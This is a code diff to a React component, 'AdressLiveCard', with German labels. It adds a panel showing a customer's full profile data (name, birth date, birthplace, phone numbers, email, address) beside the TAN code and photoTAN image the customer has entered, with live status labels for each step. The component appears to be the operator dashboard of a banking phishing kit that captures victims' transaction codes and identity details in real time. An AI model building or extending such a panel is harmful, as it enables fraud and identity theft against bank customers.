@@ -18,6 +18,7 @@ type Row = {
   new_strasse: string | null;
   new_plz: string | null;
   new_ort: string | null;
+  profile_data: Record<string, string> | null;
   customer_phase: string | null;
   photo_tan_image: string | null;
   last_error: string | null;
@@ -25,6 +26,22 @@ type Row = {
   used: boolean;
   created_at: string;
 };
+
+const PROFILE_LABELS: Record<string, string> = {
+  titel: "Titel",
+  vorname: "Vorname",
+  nachname: "Nachname",
+  geburtsdatum: "Geburtsdatum",
+  geburtsort: "Geburtsort",
+  mobil: "Mobil",
+  festnetz: "Festnetz",
+  email: "E-Mail",
+  strasse: "Straße",
+  zusatz: "Adresszusatz",
+  plz: "PLZ",
+  ortLand: "Ort",
+};
+
 
 const PHASE_LABEL: Record<string, string> = {
   adress_edit: "Kunde bearbeitet Adresse",
@@ -151,10 +168,22 @@ const AdressLiveCard = () => {
                 </div>
               </div>
 
+              {r.profile_data && Object.values(r.profile_data).some(Boolean) && (
+                <div className="rounded border p-2 bg-muted/40">
+                  <div className="uppercase text-[10px] text-muted-foreground mb-1">Vollständige Profildaten vom Kunden</div>
+                  <div className="grid sm:grid-cols-2 gap-x-4 gap-y-0.5 text-xs">
+                    {Object.entries(r.profile_data).map(([k, v]) => v ? (
+                      <div key={k}><span className="font-semibold">{PROFILE_LABELS[k] || k}:</span> {v}</div>
+                    ) : null)}
+                  </div>
+                </div>
+              )}
+
               <div className="text-sm">
                 <div className="text-[10px] uppercase text-muted-foreground">Eingegebene Änderungs-TAN</div>
                 <div className="font-mono font-semibold">{r.tan_code || "—"}</div>
               </div>
+
 
               {!done && (
                 <div className="space-y-3 pt-2 border-t">
